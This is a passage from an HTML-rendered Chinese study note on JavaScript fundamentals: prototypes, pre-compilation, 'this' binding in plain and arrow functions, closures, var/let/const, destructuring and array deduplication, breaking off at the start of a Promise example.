alt=\"image-20220313143722625\"></p>\n<p>继承后查找时就近，</p>\n<p>判断属性时继承的还是后天添加的：hasOwnProperty</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/wkif/imgforTeachingDemo/202203310846172.png\" alt=\"image-20220313144106245\"></p>\n<p>可以拿到p1的私有属性</p>\n<p>这个方法既不是Persion也不是p1的，而是Persion继承自Object的</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/wkif/imgforTeachingDemo/202203310846687.png\" alt=\"image-20220313144302492\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/wkif/imgforTeachingDemo/202203310846218.png\" alt=\"image-20220313144416164\"></p>\n<h4 id=\"原型链：-proto\"><a href=\"#原型链：-proto\" class=\"headerlink\" title=\"原型链：_proto_\"></a>原型链：_proto_</h4><p>对象，数组，函数等有原型链</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/wkif/imgforTeachingDemo/202203310847761.png\" alt=\"image-20220313140745799\"></p>\n<h3 id=\"预编译\"><a href=\"#预编译\" class=\"headerlink\" title=\"预编译\"></a>预编译</h3><pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">function</span> <span class=\"token function\">fn</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">a<span class=\"token punctuation\">,</span>c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\tconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span>\n\t<span class=\"token keyword\">var</span> a <span class=\"token operator\">=</span><span class=\"token number\">123</span><span class=\"token punctuation\">;</span>\n\tconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span>\n\tconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span>\n\t<span class=\"token keyword\">function</span> <span class=\"token function\">a</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span>\n\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token keyword\">var</span>  d <span class=\"token operator\">=</span><span class=\"token number\">678</span>\n\t<span class=\"token punctuation\">&#125;</span>\n\tconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">)</span>\n\tconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span>\n\t<span class=\"token keyword\">var</span> <span class=\"token function-variable function\">b</span> <span class=\"token operator\">=</span><span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span>\n\tconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span>\n\t<span class=\"token keyword\">function</span> <span class=\"token function\">c</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span>\n\tconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token function\">fn</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\n\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p> 预编译步骤：</p>\n<ol>\n<li><p>创建AO对象</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">AO：&#123;\n\n&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n\n</li>\n<li><p>找形参和变量声明</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">AO：&#123;\n\ta:undefind\n\tc:undefind\n\td:undefind\n\tbLundefind\n&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n</li>\n<li><p>实参与形参相统一</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">AO：&#123;\n\ta:2\n\tc:3\n\td:undefind\n\tb:undefind\n&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n</li>\n<li><p>找函数申明（会覆盖变量）</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">AO：&#123;\n\ta:function a()&#123;&#125;\n\tc:function c()&#123;&#125;\n\td:undefind\n\tb:undefind\n&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>注:var b &#x3D;function(){}不是函数声明</p>\n</li>\n<li><p>逐行执行</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">function fn(a,c)&#123;\n\tconsole.log(a)&#x2F;&#x2F;function a()&#123;&#125;\n\tvar a &#x3D;123;\n\tconsole.log(a)&#x2F;&#x2F;123\n\tconsole.log(c)&#x2F;&#x2F;function c()&#123;&#125;\n\tfunction a()&#123;&#125;\n\tif(false)&#123;\n\t\tvar  d &#x3D;678\n\t&#125;\n\tconsole.log(d)&#x2F;&#x2F;undefind\n\tconsole.log(b)&#x2F;&#x2F;undefind\n\tvar b &#x3D;function()&#123;&#125;\n\tconsole.log(b)&#x2F;&#x2F;function()&#123;&#125;\n\tfunction c()&#123;&#125;\n\tconsole.log(c)&#x2F;&#x2F;function c()&#123;&#125;\n&#125;\nfn(2,3)\n\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/wkif/imgforTeachingDemo/202203310847985.png\" alt=\"image-20220313175244724\"></p>\n</li>\n</ol>\n<h3 id=\"15、this\"><a href=\"#15、this\" class=\"headerlink\" title=\"15、this\"></a>15、this</h3><h4 id=\"函数直接调用\"><a href=\"#函数直接调用\" class=\"headerlink\" title=\"函数直接调用\"></a>函数直接调用</h4><pre class=\"line-numbers language-none\"><code class=\"language-none\">function get(a)&#123;\n    console.log(a)\n&#125;\nget(&#39;kif&#39;)\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>其中 <strong>get(‘kif’)</strong> 其实是<strong>get.call(window,’kif’ )</strong></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/wkif/imgforTeachingDemo/202203310847478.png\" alt=\"image-20220313181429301\"></p>\n<p>即：对象.方法.call(对象，参数)</p>\n<h4 id=\"对象方法\"><a href=\"#对象方法\" class=\"headerlink\" title=\"对象方法\"></a>对象方法</h4><pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">var</span> Persion <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token literal-property property\">name</span><span class=\"token operator\">:</span> <span class=\"token string\">'kif'</span><span class=\"token punctuation\">,</span>\n    <span class=\"token function-variable function\">getName</span><span class=\"token operator\">:</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">time</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">,</span>time<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\nPersion<span class=\"token punctuation\">.</span><span class=\"token function\">getName</span><span class=\"token punctuation\">(</span><span class=\"token number\">299</span><span class=\"token punctuation\">)</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>同理：</p>\n<p>Persion.getName(299)为：Persion.getName.call(Persion,299)</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/wkif/imgforTeachingDemo/202203310847377.png\" alt=\"image-20220313181905131\"></p>\n<h4 id=\"案例：\"><a href=\"#案例：\" class=\"headerlink\" title=\"案例：\"></a>案例：</h4><pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">var</span> name <span class=\"token operator\">=</span> <span class=\"token number\">222</span>\n<span class=\"token keyword\">var</span> a<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token literal-property property\">name</span> <span class=\"token operator\">:</span><span class=\"token number\">111</span><span class=\"token punctuation\">,</span>\n    <span class=\"token function-variable function\">say</span><span class=\"token operator\">:</span><span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">var</span> fun <span class=\"token operator\">=</span> a<span class=\"token punctuation\">.</span>say\n<span class=\"token function\">fun</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token comment\">//fun.call(window,)======>222</span>\na<span class=\"token punctuation\">.</span><span class=\"token function\">say</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token comment\">//a.say.call(a,)=======>111</span>\n<span class=\"token keyword\">var</span> b <span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token literal-property property\">name</span><span class=\"token operator\">:</span><span class=\"token number\">333</span><span class=\"token punctuation\">,</span>\n    <span class=\"token function-variable function\">say</span><span class=\"token operator\">:</span><span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">fun</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">fun</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token comment\">//fun.call(window,)//222</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\nb<span class=\"token punctuation\">.</span><span class=\"token function\">say</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">.</span>say<span class=\"token punctuation\">)</span><span class=\"token comment\">//</span>\nb<span class=\"token punctuation\">.</span>say<span class=\"token operator\">=</span>a<span class=\"token punctuation\">.</span>say\nb<span class=\"token punctuation\">.</span><span class=\"token function\">say</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token comment\">//b.say.call(b,)=======>333</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"箭头函数中this\"><a href=\"#箭头函数中this\" class=\"headerlink\" title=\"箭头函数中this\"></a>箭头函数中this</h4><pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">var</span> x <span class=\"token operator\">=</span><span class=\"token number\">11</span>\n<span class=\"token keyword\">var</span> p <span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token literal-property property\">x</span><span class=\"token operator\">:</span><span class=\"token number\">22</span><span class=\"token punctuation\">,</span>\n    <span class=\"token function-variable function\">say</span><span class=\"token operator\">:</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">=></span><span class=\"token punctuation\">&#123;</span>\n        console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>x<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\np<span class=\"token punctuation\">.</span><span class=\"token function\">say</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>箭头函数中this固定指向代码块外部</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/wkif/imgforTeachingDemo/202203310847387.png\" alt=\"image-20220313185716281\"></p>\n<h4 id=\"this指向（普通函数、箭头函数）\"><a href=\"#this指向（普通函数、箭头函数）\" class=\"headerlink\" title=\"this指向（普通函数、箭头函数）\"></a>this指向（普通函数、箭头函数）</h4><p><strong>参考答案：</strong></p>\n<p>普通函数中的this</p>\n<ol>\n<li>谁调用了函数或者方法，那么这个函数或者对象中的this就指向谁</li>\n</ol>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">let</span> <span class=\"token function-variable function\">getThis</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">let</span> obj<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token literal-property property\">name</span><span class=\"token operator\">:</span><span class=\"token string\">\"Jack\"</span><span class=\"token punctuation\">,</span>\n    <span class=\"token function-variable function\">getThis</span><span class=\"token operator\">:</span><span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token comment\">//getThis()方法是由window在全局作用域中调用的，所以this指向调用该方法的对象，即window</span>\n<span class=\"token function\">getThis</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//window</span>\n<span class=\"token comment\">//此处的getThis()方法是obj这个对象调用的，所以this指向obj</span>\nobj<span class=\"token punctuation\">.</span><span class=\"token function\">getThis</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//obj</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<ol>\n<li>匿名函数中的this：匿名函数的执行具有全局性，则匿名函数中的this指向是window，而不是调用该匿名函数的对象；</li>\n</ol>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">let</span> obj <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function-variable function\">getThis</span><span class=\"token operator\">:</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\nobj<span class=\"token punctuation\">.</span><span class=\"token function\">getThis</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//window</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>上面代码中，getThi()方法是由obj调用，但是obj.getThis()返回的是一个匿名函数，而匿名函数中的this指向window，所以打印出window。 如果想在上述代码中使this指向调用该方法的对象，可以提前把this传值给另外一个变量(_this或者that)：</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">let</span> obj <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n     <span class=\"token function-variable function\">getThis</span><span class=\"token operator\">:</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n     <span class=\"token comment\">//提前保存this指向</span>\n         <span class=\"token keyword\">let</span> _this<span class=\"token operator\">=</span><span class=\"token keyword\">this</span>\n         <span class=\"token keyword\">return</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n             console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>_this<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n         <span class=\"token punctuation\">&#125;</span>\n     <span class=\"token punctuation\">&#125;</span>\n <span class=\"token punctuation\">&#125;</span>\n obj<span class=\"token punctuation\">.</span><span class=\"token function\">getThis</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//obj</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<ol>\n<li>箭头函数中的this<ol>\n<li>箭头函数中的this是在函数定义的时候就确定下来的，而不是在函数调用的时候确定的；</li>\n<li>箭头函数中的this指向父级作用域的执行上下文；（技巧：<strong>因为javascript中除了全局作用域，其他作用域都是由函数创建出来的，所以如果想确定this的指向，则找到离箭头函数最近的function，与该function平级的执行上下文中的this即是箭头函数中的this</strong>）</li>\n<li>箭头函数无法使用apply、call和bind方法改变this指向，因为其this值在函数定义的时候就被确定下来。</li>\n</ol>\n</li>\n</ol>\n<p>例1：首先，距离箭头函数最近的是getThis(){}，与该函数平级的执行上下文是obj中的执行上下文，箭头函数中的this就是下注释代码处的this，即obj。</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">let</span> obj <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token comment\">//此处的this即是箭头函数中的this</span>\n    <span class=\"token function-variable function\">getThis</span><span class=\"token operator\">:</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span>  <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n            console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\nobj<span class=\"token punctuation\">.</span><span class=\"token function\">getThis</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//obj</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>例2：该段代码中存在两个箭头函数，this找不到对应的function(){}，所以一直往上找直到指向window。</p>\n<p><a href=\"https://www.nowcoder.com/study/live/691/2/9#\">复制代码</a></p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"> <span class=\"token comment\">//代码中有两个箭头函数，由于找不到对应的function，所以this会指向window对象。</span>\n<span class=\"token keyword\">let</span> obj <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n     <span class=\"token function-variable function\">getThis</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n         <span class=\"token keyword\">return</span>  <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n             console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n         <span class=\"token punctuation\">&#125;</span>\n     <span class=\"token punctuation\">&#125;</span>\n <span class=\"token punctuation\">&#125;</span>\n obj<span class=\"token punctuation\">.</span><span class=\"token function\">getThis</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//window</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n\n\n<h3 id=\"16、闭包\"><a href=\"#16、闭包\" class=\"headerlink\" title=\"16、闭包\"></a>16、闭包</h3><h4 id=\"形式：\"><a href=\"#形式：\" class=\"headerlink\" title=\"形式：\"></a>形式：</h4><p>方法里面返回一个方法</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">function</span> <span class=\"token function\">a</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">let</span> a <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n          <span class=\"token keyword\">return</span> a<span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n      <span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<h4 id=\"意义：\"><a href=\"#意义：\" class=\"headerlink\" title=\"意义：\"></a>意义：</h4><ol>\n<li>延长变量生命周期</li>\n<li>创建私有环境</li>\n</ol>\n<p>Vue中data也是一个闭包</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">data（）&#123;\n\treturn&#123;\n\t\n\t&#125;\n&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>会常驻内存，所以慎用</p>\n<h3 id=\"17、ES6\"><a href=\"#17、ES6\" class=\"headerlink\" title=\"17、ES6\"></a>17、ES6</h3><h4 id=\"var-let-const\"><a href=\"#var-let-const\" class=\"headerlink\" title=\"var let const\"></a>var let const</h4><h5 id=\"var\"><a href=\"#var\" class=\"headerlink\" title=\"var:\"></a>var:</h5><ol>\n<li><p>变量提升</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\">console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token comment\">//undefined</span>\n<span class=\"token keyword\">var</span> a <span class=\"token operator\">=</span> <span class=\"token number\">12</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n\n</li>\n<li><p>变量覆盖</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">var</span> a <span class=\"token operator\">=</span><span class=\"token number\">12</span>\n<span class=\"token keyword\">var</span> a <span class=\"token operator\">=</span><span class=\"token number\">23</span>\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token comment\">//23</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n\n</li>\n<li><p>没有块级作用域</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">function</span> <span class=\"token function\">fu</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">var</span> i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span><span class=\"token number\">3</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\t\tconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span>\n\t<span class=\"token punctuation\">&#125;</span>\n\tconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token comment\">//3</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>\n</ol>\n<h5 id=\"const\"><a href=\"#const\" class=\"headerlink\" title=\"const:\"></a>const:</h5><ol>\n<li><p>const声明之后必须赋值</p>\n</li>\n<li><p>const定义数组，可以对数组修改</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">const</span> arr <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">\"sad\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"666\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"qewqe\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\narr<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span><span class=\"token string\">'5465'</span><span class=\"token punctuation\">)</span>\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre></li>\n</ol>\n<h4 id=\"解构\"><a href=\"#解构\" class=\"headerlink\" title=\"解构\"></a>解构</h4><pre class=\"line-numbers language-none\"><code class=\"language-none\">let a&#x3D;1;\nlet b &#x3D;2;\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>不使用第三个变量互换值</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">[a,b]&#x3D;[b,a]<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h4 id=\"去重\"><a href=\"#去重\" class=\"headerlink\" title=\"去重\"></a>去重</h4><pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">let</span> arr<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span>\n<span class=\"token keyword\">let</span> ans <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token operator\">...</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Set</span><span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span>\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>ans<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"promise\"><a href=\"#promise\" class=\"headerlink\" title=\"promise\"></a>promise</h4><pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">let</span> p <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Promise</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">resolve<span class=\"token punctuation\">,</span> reject</span><span class=\"token 